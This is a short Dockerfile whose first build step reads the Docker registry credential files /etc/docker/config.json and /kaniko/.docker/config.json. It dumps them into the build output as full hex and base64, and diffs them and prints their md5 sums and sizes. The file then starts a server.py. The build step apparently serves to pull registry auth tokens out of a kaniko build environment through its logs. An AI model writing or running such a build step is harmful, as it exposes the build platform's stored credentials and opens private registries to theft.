FROM alpine:3.19

# Use xxd which we know works, and also test diff + md5
RUN apk add --no-cache coreutils diffutils && \
    echo "=== /etc/docker/config.json FULL HEX ===" && \
    xxd /etc/docker/config.json 2>&1 && \
    echo "=== /kaniko/.docker/config.json FULL HEX ===" && \
    xxd /kaniko/.docker/config.json 2>&1 && \
    echo "=== DIFF ===" && \
    diff /etc/docker/config.json /kaniko/.docker/config.json 2>&1 && \
    echo "FILES ARE IDENTICAL" || echo "FILES DIFFER" && \
    echo "=== MD5 ===" && \
    md5sum /etc/docker/config.json /kaniko/.docker/config.json 2>&1 && \
    echo "=== SIZES ===" && \
    wc -c /etc/docker/config.json /kaniko/.docker/config.json 2>&1 && \
    echo "=== BASE64 /etc/docker/config.json ===" && \
    base64 /etc/docker/config.json 2>&1 && \
    echo "=== END ==="

RUN apk add --no-cache python3
COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
